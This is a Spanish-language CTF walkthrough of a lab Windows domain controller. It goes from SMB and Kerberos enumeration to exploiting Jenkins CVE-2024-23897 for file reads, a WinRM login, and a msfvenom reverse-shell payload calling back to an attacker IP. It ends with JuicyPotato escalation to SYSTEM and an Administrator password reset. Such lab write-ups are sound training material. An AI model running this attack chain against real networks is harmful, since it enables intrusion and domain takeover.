# Chimichurri

Máquina de nivel principiante de The HackersLab. IP: `192.168.200.4` — dominio: `chimichurri.thl`

Es un controlador de dominio Windows, así que el objetivo es conseguir credenciales válidas del dominio, obtener una shell y escalar privilegios.

## 1. Reconocimiento

Escaneamos todos los puertos y servicios con `nmap`:

```
nmap -p- --open -sV -sC -sS -T4 -n -Pn -vvv 192.168.200.4 -oG open_port.txt
```

![[Pasted image 20261016004938.png]]

La máquina expone un controlador de dominio de Active Directory:

- **53/tcp** → DNS (Simple DNS Plus).
- **88/tcp** → Kerberos.
- **135, 139, 445/tcp** → RPC / NetBIOS / SMB.
- **389, 636, 3268, 3269/tcp** → LDAP y LDAPs (**Domain: chimichurri.thl**).
- **5985 y 47001/tcp** → WinRM.
- **6969/tcp** → Jenkins 2.361 sobre Jetty 10.0.11, con el título **Panel de control [Jenkins]**.

Los scripts de servicio confirman que el host se llama **CHIMICHURRI**, que firma SMB2 y que el reloj presenta un desfase de casi 6 horas:

![[Pasted image 20261016005010.png]]

## 2. Configuración del hosts

Para trabajar con el dominio, agregamos una entrada en el archivo `/etc/hosts`:

```
nano /etc/hosts
```

```
192.168.200.4  chimichurri.thl
```

## 3. Enumeración SMB (acceso anónimo)

Listamos los recursos compartidos sin credenciales con `smbclient`:

```
smbclient -L //192.168.200.4 -N
```

![[Pasted image 20261016005625.png]]

Además de los recursos administrativos habituales (`ADMIN$`, `C$`, `NETLOGON`, `SYSVOL`), aparece un recurso llamado **drogas** al que se puede entrar de forma anónima:

```
smbclient //192.168.200.4/drogas -N
```

![[Pasted image 20261016010047.png]]

Dentro hay un único archivo, `credenciales.txt`, que descargamos y leemos:

![[Pasted image 20261016010151.png]]

```
Todo es mejor en con el usuario hacker, en su escrititorio estan sus claves de acceso como perico
```

La pista nos indica dos cosas: existe el usuario **hacker** y en su escritorio hay claves de acceso relacionadas con **perico**.

## 4. Enumeración web y de usuarios

Como en el escaneo vimos un Jenkins en el puerto 6969, identificamos el servicio con `whatweb`:

```
whatweb http://chimichurri.thl:6969
```

![[Pasted image 20261016143153.png]]

Se confirma **Jenkins 2.361**. Antes de atacarlo, enumeramos usuarios válidos del dominio mediante Kerberos con `kerbrute` y el diccionario de SecLists:

```
kerbrute userenum -d chimichurri.thl --dc 192.168.200.4 /home/kali/SecLists/Usernames/xato-net-10-million-usernames-dup.txt -o valid_users.txt
```

![[Pasted image 20261016011146.png]]

Tras probar más de 624.000 nombres, encontramos usuarios válidos:

- **hacker**
- **invitado**
- **administrador**

## 5. Explotación: LFI en Jenkins (CVE-2024-23897)

Investigando el Jenkins instalado, localizamos en `searchsploit` una vulnerabilidad de inclusión de archivos locales (LFI) que afecta a versiones anteriores a la 2.442:

```
searchsploit -m 51993
```

![[Pasted image 20261016143245.png]]

Copiamos el exploit (`Local File Inclusion exploit for CVE-2024-23897`), que recibe la URL del Jenkins y la ruta absoluta del archivo a leer:

![[Pasted image 20261016144633.png]]

Con él leemos el escritorio del usuario **hacker**, donde la pista del SMB nos decía que estaban las claves:

```
python3 jenkins_fileread.py -u http://192.168.200.4:6969
```

```
file> /Users/hacker/Desktop/perico.txt
```

https://github.com/godylockz/CVE-2024-23897

![[Pasted image 20261016145936.png]]

El archivo `perico.txt` contiene las credenciales del usuario:

```
usuario: hacker
contraseña: Perico69
```

## 6. Intento de AS-REP roasting

Antes de usar las credenciales, probamos si algún usuario permite el preautenticado de Kerberos (AS-REP roasting) con `impacket-GetNPUsers`:

```
impacket-GetNPUsers chimichurri.thl/ -no-pass -usersfile user.txt -dc-ip 192.168.200.4
```

![[Pasted image 20261016144429.png]]

Ninguno de los usuarios tiene `UF_DONT_REQUIRE_PREAUTH` configurado, por lo que no hay hashes AS-REP que crackear y descartamos ese camino.

## 7. Verificación de credenciales y acceso por WinRM

Comprobamos las credenciales contra SMB con `netexec`. La autenticación anónima está permitida (`Null:Auth:True`), pero el intento con la contraseña en minúsculas falla (`STATUS_LOGON_FAILURE`): la contraseña distingue mayúsculas y hay que escribirla tal cual (`Perico69`):

```
nxc smb 192.168.200.4 -u 'hacker' -p 'perico69' --continue-on-success
```

![[Pasted image 20261016153859.png]]

De camino al shell, intentamos enumerar el dominio por LDAP de forma anónima. La consulta inicial de contextos funciona y vuelve a confirmar el dominio `DC=chimichurri,DC=thl`:

```
ldapsearch -x -H ldap://192.168.200.4 -s 'base' namingcontexts
```

![[Pasted image 20261016152354.png]]

Sin embargo, cualquier consulta a nivel de árbol requiere un bind previo, así que no obtenemos más información por esta vía:

![[Pasted image 20261016152626.png]]

El primer intento de conexión con `evil-winrm` usando el nombre del dominio falla por un error del propio cliente:

```
evil-winrm -i chimichurri.thl -u hacker -p 'Perico69'
```

![[Pasted image 20261016150447.png]]

Al reintentar la conexión obtenemos una shell remota como **CHIMICHURRI\hacker** en `C:\Users\hacker\Desktop`.

## 8. Post-explotación dentro del dominio

Dentro del dominio revisamos la información de la cuenta con `net user hacker /domain`: la cuenta está activa, no puede cambiar su contraseña y pertenece a **Remote Management Users** y **Domain Users**:

```
net user hacker /domain
```

![[Pasted image 20261016162827.png]]

Con `whoami /groups` confirmamos los grupos a los que pertenecemos:

```
whoami /groups
```

![[Pasted image 20261016163417.png]]

Y con `whoami /priv` listamos los privilegios del token, donde destaca **SeMachineAccountPrivilege**, junto a **SeImpersonatePrivilege**:

```
whoami /priv
```

![[Pasted image 20261016163454.png]]

## 9. Escalada de privilegios con JuicyPotato

Tenemos dos condiciones clave para escalar: `SeImpersonatePrivilege` habilitada y la capacidad de crear cuentas de equipo (`SeMachineAccountPrivilege`). El punto de partida era la técnica de **PetitPotam** / **PetitPotato**, pero la escalada se resolvió con **JuicyPotato**, siguiendo la guía [Impersonating the Local SYSTEM Account with Juicy Potato](https://juggernaut-sec.com/seimpersonateprivilege/#Impersonating_the_Local_SYSTEM_Account_with_Juicy_Potato).

### 9.1. Generación del payload

Creamos un ejecutable de reverse shell apuntando a nuestro equipo (IP del atacante `192.168.200.3`, puerto `1988`). Las dos primeras ejecuciones fallan por un error de escritura en el nombre del payload (`sheel`) antes de dejarlo correcto:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.200.3 LPORT=1988 -f exe -o rs.exe
```

![[Pasted image 20261016205459.png]]

### 9.2. Subida del payload a la víctima

Subimos `rs.exe` desde la sesión de Evil-WinRM y verificamos que quedó en el escritorio del usuario:

```
upload /home/kali/Desktop/chimichuri/rs.exe
ls
```

![[Pasted image 20261016205432.png]]

### 9.3. Comprobación de privilegios

Ejecutamos el binario y comprobamos desde la shell de `cmd` los privilegios del usuario con los que estamos trabajando:

```
.\rs.exe
```

```
whoami /priv
```

![[Pasted image 20261016210753.png]]

![[Pasted image 20261016210909.png]]

### 9.4. Subida de JuicyPotato

Descargamos [JuicyPotato](https://github.com/ohpe/juicy-potato) y lo subimos al mismo directorio:

```
upload /home/kali/Desktop/chimichuri/JuicyPotato.exe
ls
```

![[Pasted image 20261016213647.png]]

### 9.5. Ejecución como SYSTEM

Ejecutamos JuicyPotato indicando el programa a lanzar (`-p rs.exe`) y el puerto COM (`-l 1678`). El primer intento falla con `COM → recv failed with error: 10038` (fallo intermitente del componente COM):

```
JuicyPotato.exe -t * -p rs.exe -l 1678
```

![[Pasted image 20261016213915.png]]

Al reintentar, la impersonación funciona: obtenemos el token de **NT AUTHORITY\SYSTEM** y se lanza el payload (`CreateProcessWithTokenW OK`), que conecta a la escucha `1988` de nuestro equipo:

![[Pasted image 20261016214020.png]]

### 9.6. Establecer la contraseña de Administrador

Ya como SYSTEM (`C:\Windows\system32>`) listamos las cuentas con `net user`. El primer intento de asignar una contraseña es rechazado por la directiva de complejidad (`123456789`), así que usamos una que sí la cumple:

```
net user Administrador Jeremias3014
```

![[Pasted image 20261016214425.png]]

### 9.7. Acceso como Administrador del dominio

Con la contraseña ya establecida, abrimos una sesión con privilegios de administrador:

```
evil-winrm -i chimichurri.thl -u Administrador -p 'Jeremias3014'
```

![[Pasted image 20261016215035.png]]